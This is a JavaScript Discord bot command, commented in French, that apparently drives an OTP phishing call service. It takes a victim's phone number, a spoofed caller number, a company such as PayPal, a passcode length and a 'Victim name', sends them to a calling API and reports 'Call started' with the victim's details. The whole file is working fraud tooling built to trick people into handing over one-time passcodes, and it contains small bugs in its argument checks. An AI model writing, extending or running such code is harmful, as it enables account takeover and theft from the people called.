module.exports = function(m) {
    /**
     * Instanciation des dépendences de la fonction
     */
    const axios = require('axios');
    const qs = require('qs');

    /**
     * Importation du fichier config contenant les données du BOT
     */
    const config = require('../config');

    /**
     * Fonction permettant d'envoyer des embed sur discord
     */
    const embed = require('../embed');

    /**
     * Si la commande n'est pas call, alors finir la fonction
     */
    if (m.command !== "call" && m.command !== "calltest") return false;

    /**
     * Si la commande ne contient pas 2 arguments, finir la fonction et renvoyer une erreur
     */
    if(m.args.length < 3) return embed(m.message, 'Need more arguments', 15158332, 'You need to give 5 arguments, example : **.call 3361234567 5155856414 paypal 6 Pizza**', m.user);
    
    /**
     * Si le numéro de téléphone ou le service ne correspond pas aux regex, alors renvoyer une erreur
     */
    if(!m.args['0'].match(/^\d{8,14}$/g)) return embed(m.message, 'Bad phone number', 15158332, 'This user phone number is not good, a good one : **33612345678**', m.user);
    if(!m.args['1'].match(/^\d{8,14}$/g)) return embed(m.message, 'Bad phone number', 15158332, 'This from phone number is not good, a good one : **5155856414** check #from-numbers', m.user);
    if(!m.args['2'].match(/[a-zA-Z]+/gm)) return embed(m.message, 'Bad service name', 15158332, 'This service name is not good, a good one : **paypal**', m.user);
    if(!m.args['3'].match(/[0-9]/) || m.args['2'] > 30) return embed(m.message, 'Bad otp length', 15158332, 'This otp length is not good, a good one : **6** or **8** (can\'t be superior to 50)', m.user);
    
    /**
     * Si la commande est !calltest alors l'on passe en call de test avec l'user test
     */
    m.user = m.command == "calltest" ? 'test' : m.user;
    m.args['3'] = m.args['3'] == undefined ? '' : m.args['3'];

    /**
     * Si toutes les conditions ont été passées, alors envoyer une requête à l'api d'appel
     */
    err = null;
    axios.post(config.apiurl + '/call/', qs.stringify({
        password: config.apipassword,
        to: m.args['0'],
        user: m.user,
        from: m.args['1'],
        otplength: m.args['3'],
        service: m.args['2'].toLowerCase(),
        name: m.args['4'] || null
    }))
    .then(d => {
        if(d.data.error != undefined || d.data.error != null) {
            return embed(m.message, ':boom: Call Error :boom:', 15158332, d.data.error, m.user)
        }
    })
    .catch(error => {
        console.error(error)
    })

    /**
     * Réponse disant que le call api a bien été passé
     */

    return embed(m.message, ':boom: Call started :boom:', 15158332, '☎️ Calling: **' + m.args['0'] + '** \n\n :mobile_phone: From: **' + m.args['1'] + '**\n\n ☂️ Victim name: **' + m.args['4'] + '** \n\n 🏢 Company: **' + m.args['2'] + '**.', m.user)
}